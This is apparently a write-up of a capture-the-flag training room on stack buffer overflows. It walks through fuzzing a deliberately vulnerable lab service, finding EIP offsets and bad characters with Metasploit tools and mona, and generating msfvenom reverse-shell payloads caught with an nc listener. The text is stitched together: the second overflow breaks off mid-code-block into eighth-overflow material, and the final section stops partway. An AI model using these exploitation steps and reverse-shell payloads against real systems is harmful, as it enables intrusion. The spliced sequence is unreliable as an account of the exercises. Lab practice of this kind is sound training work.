### Introduction

[Buffer Overflow Prep] by Tib3rius, This room is quite long so is gonna be a long post.

I will be demonstrating the exploitation of buffers overflows.

### OVERFLOW 1

Let's start the Machine and connect to it like it explains with **xfreerdp** or with **remmina** like in my case.

![Deploy](/images/THM/buffprep/Captura.PNG)

First of all, We're going to start **Immunity Debugger**.

![Immunity Debugger](/images/THM/buffprep/of1/Captura.PNG)

Then let's config the [Mona] workingfolder.

```sh
!mona config -set workingfolder c:\mona\%p
```

![Mona workingfolder](/images/THM/buffprep/of1/Captura2.PNG)

For last one step, We need to **attach** or **open** the software.

![Immunity oscp.exe](/images/THM/buffprep/of1/Captura3.PNG)

Let's try to connect to the service and see if works.

![Interaction](/images/THM/buffprep/of1/Captura4.PNG)

##### Fuzzing

We will use the code that they offer us, to go faster in solving the exercises.

![Code](/images/THM/buffprep/of1/Captura5.PNG)

If we execute it, we can see, It crash at **2000 bytes**.

```sh
python3 fuzz.py
```

![Fuzzing](/images/THM/buffprep/of1/Captura6.PNG)

In the Immunity debugger, we can see the program crashed and is **Paused**

![Immunity broke](/images/THM/buffprep/of1/Captura7.PNG)

##### Controlling EIP

Time to control the EIP and for that we need to find the **Offset**.

For do that we need to create a pattern, we can use the tool in **metasploit-framework**.
Since the program crashed at 2000 bytes, let's create a pattern with a length of **2100 bytes**.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```

![Pattern](/images/THM/buffprep/of1/Captura8.PNG)

We will put the pattern in the **payload** variable.

![Exploit code](/images/THM/buffprep/of1/Captura9.PNG)

And we execute It.

![Exploit execution](/images/THM/buffprep/of1/Captura10.PNG)

We can see the **EIP** with the value **6FA3396E**.

![Immunity EIP](/images/THM/buffprep/of1/Captura11.PNG)

It's time to see the offset with another tool in **metasploit-framework**.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q 6FA3396E
```

![Offset](/images/THM/buffprep/of1/Captura12.PNG)

- What is the EIP offset for OVERFLOW1?
>Answer: 1978

Now let's make sure we have control of the offset, so we'll modify the **retn** variable by adding four "B"s. If we are correct in the **EIP** field, we will see the 42 hexadecimal code of the letter "B".

![Exploit modify](/images/THM/buffprep/of1/Captura13.PNG)

Like we can see in Immunity Debugger, we can see the **EIP** value with the four "B"s.

![EIP controll](/images/THM/buffprep/of1/Captura14.PNG)

##### Finding Bad Characters

Time to find the **BadChars**!
And to do that we will put the 255 characters in hexadecimal in the variable **payload**.

![Exploit badchars](/images/THM/buffprep/of1/Captura15.PNG)

To compare and see what the bad characters are, we'll use a **mona** command to generate a file in the previously configured working directory, which will contain all the characters.

***Note: The character \x00 will not be put anywhere, since it is the null byte***.

```sh
!mona bytearray -b "\x00"
```

![Mona bytearray](/images/THM/buffprep/of1/Captura16.PNG)

Now let's execute the exploit.

It's important to see the value of **ESP**, in this case we can see the value is **018EFA30**.

![Immunity ESP](/images/THM/buffprep/of1/Captura17.PNG)

With **mona**, we can compare the badchars, and there we go, we can see that it returns the following characters: **(00, 07, 08, 2e, 2f, a0, a1)**

It must be emphasized that not all of them may be badchars, since sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

```sh
!mona compare -f C:\mona\oscp\bytearray.txt -a <ESP>
```

![Mona ESP compare](/images/THM/buffprep/of1/Captura18.PNG)

So to find them all, we'll remove the badchars one by one and compare them to the **bytearray** created earlier.

![Exploit badchars modify](/images/THM/buffprep/of1/Captura19.PNG)

As we can see here, we have removed the **\x07** character and the **\x08** no longer appears as badchar, that means it was being corrupted by the previous byte.

```sh
!mona compare -f C:\mona\oscp\bytearray.txt -a <ESP>
```

![Badchars show 1](/images/THM/buffprep/of1/Captura20.PNG)

We repeat this process until we find all the badchars and we will be left with the following: **(00, 07, 2e, a0)**

```sh
!mona compare -f C:\mona\oscp\bytearray.txt -a <ESP>
```

![Badchars final](/images/THM/buffprep/of1/Captura21.PNG)

- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?
>Answer: \x00,\x07,\x2e,\xa0

##### Finding Right Module

Now it's time to find the jump point for the execution of our shellcode. We can use **mona** to make it easier for us to find the right module to jump to that doesn't use the badchars we found. We'll need to make the **EIP** record point to a memory address with executable permissions and **ASLR** disabled.

```sh
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

We can use the first one, with the vale **625011af**.

![Mona jmp](/images/THM/buffprep/of1/Captura22.PNG)

We will put the written values backwards, since the system is little endian.

![Exploit modify retn](/images/THM/buffprep/of1/Captura23.PNG)

##### Generating Payload

Now It's time to generate the payload.

Since we want that after the execution of the exploit we can continuously access the system without the service corrupting, we change the exit function to a **thread mode**, making the thread die instead of the parent process. We will use the **EXITFUNC** with the value **thread**.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<OUR IP> LPORT=<Port that we want> EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

![Msfvenom](/images/THM/buffprep/of1/Captura24.PNG)

##### Exploit

Now we will enter the generated payload in the **payload** variable.

![Exploit payload](/images/THM/buffprep/of1/Captura25.PNG)

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes

![Exploit padding](/images/THM/buffprep/of1/Captura26.PNG)

Now we will start the listener on the previously configured port.

```sh
nc -lvnp <port>
```

![Listener](/images/THM/buffprep/of1/Captura27.PNG)

We will execute the exploit and if everything is configured correctly, we will obtain a shell, and thus we will have completed the first overflow.

![Listener connection](/images/THM/buffprep/of1/Captura28.PNG)


### OVERFLOW 2

We are going to perform the second overflow.

##### Fuzzing

We will modify the fuzzing script, changing the variable **prefix** with the value **OVERFLOW2**.

![Fuzz code](/images/THM/buffprep/of2/Captura.PNG)

If we execute it, we can see, It crash at **700 bytes**.

```sh
python3 fuzz.py
```

![Fuzzing](/images/THM/buffprep/of2/Captura2.PNG)

##### Controlling EIP

Time to control the EIP and for that we need to find the **Offset**.

```

![Pattern](/images/THM/buffprep/of2/Captura3.PNG)

We will put the pattern in the **payload** variable and we execute It.

We can see the **EIP** with the value **76413176**.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 800 -q 76413176
```

![Offset](/images/THM/buffprep/of2/Captura5.PNG)

- What is the EIP offset for OVERFLOW2?
>Answer: 634

Now let's make sure we have control of the offset, by adding four "B"s. If we are correct in the **EIP** field, we will see the 42 hexadecimal code of the letter "B".

![EIP Control](/images/THM/buffprep/of2/Captura6.PNG)

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1900
```

![Pattern](/images/THM/buffprep/of8/Captura2.PNG)

We will put the pattern in the **payload** variable and we execute It.

We can see the **EIP** with the value **68433568**.

![Immunity EIP](/images/THM/buffprep/of8/Captura3.PNG)

To change the dynamic a bit, this time instead of using the **metasploit-framework** tool, we'll use **mona** to find the offset.

```sh
!mona findmsp -distance 1900
```

![Offset](/images/THM/buffprep/of8/Captura4.PNG)

- What is the EIP offset for OVERFLOW8?
>Answer: 1786

We can see we control the **EIP**.

##### Finding Bad Characters

Time to find the **BadChars**!

We can compare the badchars, and see which ones are returned. It returns the following characters: **(00, 1d, 1e, 2e, 2f, c7, c8, ee, ef)**

```sh
!mona compare -f C:\mona\oscp\bytearray.txt -a <ESP>
```

![Mona ESP compare](/images/THM/buffprep/of8/Captura6.PNG)

We are eliminating badchar by badchar, until we get them all: **(00, 1d, 2e, c7, ee)**

![Badchars final](/images/THM/buffprep/of8/Captura7.PNG)

- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW8?
>Answer: \x00,\x1d,\x2e,\xc7,\xee

##### Finding Right Module

Time to find the jump point for the execution of our shellcode.

```sh
!mona jmp -r esp -cpb "\x00,\x1d,\x2e,\xc7,\xee"
```

We can use the first one, with the vale **625011af**.

##### Generating Payload

It's time to generate the payload.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<OUR IP> LPORT=<Port that we want> EXITFUNC=thread -b "\x00,\x1d,\x2e,\xc7,\xee" -f c
```

![Msfvenom](/images/THM/buffprep/of8/Captura9.PNG)

##### Exploit

We prepare our exploit with everything we need and run it.

![Final Exploit](/images/THM/buffprep/of8/Captura10.PNG)

We will obtain a shell, and thus we will have completed the eighth overflow.

```sh
nc -lvnp <port>
```

![Connection](/images/THM/buffprep/of8/Captura11.PNG)

### OVERFLOW 9

We are going to perform the ninth overflow.

##### Fuzzing

If we execute it, we can see, It crash at **1600 bytes**.

```sh
python3 fuzz.py
```

![Fuzzing](/images/THM/buffprep/of9/Captura.PNG)

##### Controlling EIP

Time to control the EIP and for that we need to find the **Offset**.

We will generate the pattern.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700
```

![Pattern](/images/THM/buffprep/of9/Captura2.PNG)

We will put the pattern in the **payload** variable and we execute It.

We can see the **EIP** with the value **35794234**.

![Immunity EIP](/images/THM/buffprep/of9/Captura3.PNG)

We will use the same method as in Overflow 8 to get the offset with **mona**.

```sh
!mona findmsp -distance 1700
```
